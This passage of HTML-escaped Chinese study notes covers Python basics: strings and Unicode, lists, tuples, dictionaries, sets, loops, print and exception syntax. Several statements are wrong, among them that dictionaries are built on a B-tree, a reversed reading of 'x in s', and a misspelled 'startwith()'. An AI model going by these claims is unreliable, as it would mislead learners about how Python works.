&lt;li&gt;代表裏面存的編碼是 unicode&lt;br /&gt;
    + &lt;code&gt;ur'字串'&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;代表 raw string 裏面存的編碼是 unicode&lt;br /&gt;
    + ur 的順序是固定的 不可以寫成 ru&lt;br /&gt;
    + &lt;code&gt;u'''字串'''&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;代表裏面存的編碼是 unicode&lt;br /&gt;
    + &lt;code&gt;ord(字元)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;將字元轉成 ascii&lt;br /&gt;
    + &lt;code&gt;chr(ascii編碼)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;將 ascii 編碼轉成字元&lt;br /&gt;
    + &lt;code&gt;unichr(unicode編碼)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;將 unicode 編碼轉成 unicode 字串&lt;br /&gt;
    + Decoding (str -&amp;gt; unicode)&lt;br /&gt;
    + &lt;code&gt;'中文'.decode('utf-8') == unicode('中文', 'utf-8')&lt;/code&gt;&lt;br /&gt;
    + Encoding (unicode -&amp;gt; str)&lt;br /&gt;
    + &lt;code&gt;u'中文'.encode('utf-8')&lt;/code&gt;&lt;br /&gt;
    + python2 設計的時候沒有考慮到 unicode 的問題&lt;br /&gt;
    + python3 的 str 就是 unicode&lt;br /&gt;
        + 新的型態 &lt;code&gt;bytes&lt;/code&gt; (Immutable seq.)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常用 method (詳細的 method 請參見 python 的 doc)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;decode()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;encode()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;endswith()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;find()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;format()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;join()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;lower()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;partition()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;replace()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;split()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;startwith()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;strip()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;upper()&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;string formatting&lt;br /&gt;
    + modulo (&lt;code&gt;%&lt;/code&gt;)&lt;br /&gt;
        + &lt;code&gt;%r&lt;/code&gt;&lt;br /&gt;
            + representation&lt;br /&gt;
            + &lt;code&gt;'Hello, %s' % name&lt;/code&gt;&lt;br /&gt;
                + 用 &lt;code&gt;name&lt;/code&gt; 的內容取代 &lt;code&gt;%s&lt;/code&gt;&lt;br /&gt;
    + &lt;code&gt;str.format()&lt;/code&gt;&lt;br /&gt;
        + &lt;code&gt;'Hello, {}'.format(name)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;List and tuple&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="center"&gt;List (Mutable seq.)&lt;/th&gt;
&lt;th align="center"&gt;Tuple (Immutable seq.)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="center"&gt;[] or list()&lt;/td&gt;
&lt;td align="center"&gt;() or tuple()&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;['item']&lt;/td&gt;
&lt;td align="center"&gt;('item', ) # 只有一個的情況下要加逗點&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;元素可以放不同的型態&lt;/td&gt;
&lt;td align="center"&gt;元素可以放不同的型態&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;List 在 python 中的實作是用 array, 所以會比較慢  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Sequence&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Immutable seq. 支援的操作  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;x in s&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;查 &lt;code&gt;s&lt;/code&gt; 是不是在 &lt;code&gt;x&lt;/code&gt; 裏面, 結果會回傳 &lt;code&gt;boolean&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;x not in s&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;搜尋是用 linear search, 效能上要注意一下  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s + t&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;s * n&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;slice&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;string.len()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;string.index(a)&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;如果沒找到 &lt;code&gt;a&lt;/code&gt; 的話會跳出 except 的訊息  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;string.count(a)&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;計算 string 裏面 &lt;code&gt;a&lt;/code&gt; 出現幾次  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mutable seq. 支援的操作  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;s[1] = x&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;s[i:j] = t&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;del s[i:j]&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;s[i:j:k]&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;s.append(x)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;s.insert(i,x)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;s.pop([i])&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;s.remove(x)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;s.extend(x)&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;擴充 &lt;code&gt;s&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s.append(x)&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;將 &lt;code&gt;x&lt;/code&gt; 加進去變成元素  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;in-place&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;s.sort()&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;內建的 sort 是 &lt;a href="https://en.wikipedia.org/wiki/Timsort"&gt;Timsort&lt;/a&gt;, 是個改良板的 &lt;a href="https://en.wikipedia.org/wiki/Merge_sort"&gt;merge sort&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s.reverse()&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;把 seq. 顛倒過來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sequence 支援 比較 的動作  &lt;/li&gt;
&lt;li&gt;Slicing and slice  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;s[:]    # a copy of the whole array&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Mapping&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Dictionary (Mutable map)  &lt;ul&gt;
&lt;li&gt;就是 key-value pairs  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;{'A':1, 'B':2, 'C':3}&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;dict(A=1, B=2, C=3)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;實作是用 B tree 所以不會照順序,  &lt;/li&gt;
&lt;li&gt;如果要照順序的話可以用 collections 的 ordered dictionary  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;collections.OrderedDict()&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;或是把 key 存在一個 list 裏面  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;zip()&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;ABC&amp;#39;&lt;/span&gt;  
&lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;pairs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;zip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="c1"&gt;# pairs 會變成 [(&amp;#39;A&amp;#39;, 1), (&amp;#39;B&amp;#39;, 2), (&amp;#39;C&amp;#39;, 3)]  &lt;/span&gt;
&lt;span class="c1"&gt;# dict(pairs) 是 {&amp;#39;A&amp;#39;: 1, &amp;#39;C&amp;#39;: 3, &amp;#39;B&amp;#39;: 2}  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;dictionary 可以用 string 當 key, list 就不行  &lt;/li&gt;
&lt;li&gt;支援的操作 (k is the name of key)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;len(d)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;d[k]&lt;/code&gt;    &lt;/li&gt;
&lt;li&gt;&lt;code&gt;d[k] = v (Mutable)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;del d[k]&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;k in d, k not in d&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;d.copy()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;d.get(key[, default])&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;d.setdefault(key[, default])&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;d.items(), d.keys(), d.values()&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;在 python 3 裏面這 3 個函式回傳的都是 iter 不是 list  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;d.pop(key[, default])&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;d.update([other])&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;d.update(dict(...))&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;None&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;是個 object, 有點類似 c 裏面的 &lt;code&gt;NULL&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;可以用 python 先簡單寫出演算法並證明自己的想法, 再用 C 去實作出來  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Set (mutable set)&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# python2  &lt;/span&gt;
&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ABC&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;B&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;C&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;  
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;B&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;C&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="c1"&gt;# python3  &lt;/span&gt;

&lt;span class="c1"&gt;# s 代表 set  &lt;/span&gt;
&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;  
&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;elem&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;discard&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;elem&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;|=&lt;/span&gt; &lt;span class="n"&gt;other_s&lt;/span&gt;  
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;=&lt;/span&gt; &lt;span class="n"&gt;other_s&lt;/span&gt;  
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;other_s&lt;/span&gt;  
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;other_s&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Flow Control&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;注意冒號和縮排    &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;if-else&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;condition 不需要用 &lt;code&gt;()&lt;/code&gt; 包起來  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;condition_1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;condition_2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;condition_N&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;被視為 False 的值&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;None&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;False&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Zeros  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;0&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;0.0&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;0L&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;0j&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Empty containers  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;''&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;[]&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;{}&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__nonzero__()&lt;/code&gt; or&lt;code&gt;__len__()&lt;/code&gt; return &lt;code&gt;0&lt;/code&gt; or &lt;code&gt;False&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;注意:&lt;br /&gt;
&lt;code&gt;if [0]&lt;/code&gt;: 和 &lt;code&gt;if [[]]&lt;/code&gt;: 後的敘述會被執行&lt;br /&gt;
因為 [] 裏面有包含東西就不會被視為空的&lt;br /&gt;
() 和 {} 也是同樣的道理  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;for (for-each 的性質, python 裏面只有這種for)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;for [item] in [iterable]:&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;for i in range(3):&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;會建個 list 出來, 比較浪費資源  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;for i in xrange(3):&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;xrange 只會建個 iter, 比較節省資源  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;python3 沒有 &lt;code&gt;xrange()&lt;/code&gt;, 因為 python3 的 &lt;code&gt;range()&lt;/code&gt; 就是 python2 的 &lt;code&gt;xrange()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;python3 裏面把很多東西都改成比較節省資源的方式  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;enumerate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sth&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt;  

&lt;span class="c1"&gt;# i 會是從0開始的 index, item 就是 sth 裏面的 element  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;python 的 &lt;code&gt;for&lt;/code&gt; 可以 iterate all of iterable object  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;iter(sth)&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;可以把 sth 轉成 iter 後回傳  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;while&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;tasks&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;tasks&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  

&lt;span class="c1"&gt;# 當 tasks 變成 empty 的時候就跳出迴圈  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;break, continue (都只能用在 loop 裏面)&lt;/h3&gt;
&lt;p&gt;就跟 C 一樣,&lt;br /&gt;
可能可以讓 python 執行的更快&lt;br /&gt;
因為python是 interpretation&lt;br /&gt;
提前結束的話可以少跑一些程式&lt;br /&gt;
所以 python 鼓勵使用 &lt;code&gt;break&lt;/code&gt; 和 &lt;code&gt;continue&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;The else Clause on Loops (while, for)&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;loops&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;上面的迴圈如果沒有被 &lt;code&gt;break&lt;/code&gt; 提前結束的話&lt;br /&gt;
就會進入 &lt;code&gt;else&lt;/code&gt;&lt;br /&gt;
可以用來取代平常設定的 flag  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 2 - 2013.03.10&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://j.mp/mosky-python"&gt;今日投影片&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://j.mp/mosky-py"&gt;最新版投影片&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;print&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;print 'Print', 'multiple'&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Print 和 multiple 中間會有空白  &lt;ul&gt;
&lt;li&gt;在 python2 裏面拿不掉  &lt;/li&gt;
&lt;li&gt;可以用 &lt;code&gt;sys&lt;/code&gt; 裏面的 &lt;code&gt;write&lt;/code&gt; 代替就沒有空白  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;print&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;印一個新行  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;print()&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;python2 會印一對括號  &lt;/li&gt;
&lt;li&gt;python3 會印一個新行  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;print('End with a space.', end='')&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;會把最後因為逗號出現的空白去掉  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;print('A', 'B', 'C', sep=',')&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;sep&lt;/code&gt; 預設是一個空白  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Sequence Comparison&lt;/h2&gt;
&lt;p&gt;python 裏面沒有字元 只有長度為1的字串&lt;br /&gt;
所以 &lt;code&gt;'A' &amp;gt; 65&lt;/code&gt; 是 &lt;code&gt;True&lt;/code&gt;&lt;br /&gt;
通常不會拿 字串 和 整數 做比較&lt;br /&gt;
在 python3 裏面用 seq 跟不是 seq 的型態比較會出現 type error  &lt;/p&gt;
&lt;h2&gt;if-else 補充 (類似 Ternary 的用法)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Python 中並沒有 C 的 &lt;code&gt;?:&lt;/code&gt; (ternary operator)，但可以用下面這寫法來達到  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;[exp. if conditon true] if [condition] else [exp. if condition false]&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;也就是說，C 裡頭的  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;b&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;等同於 Python 裡頭的  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;b&amp;#39;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;try&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# python2  &lt;/span&gt;
&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;LookupError&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ne"&gt;IndexError&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ne"&gt;KeyError&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="k"&gt;finally&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# python3  &lt;/span&gt;
&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
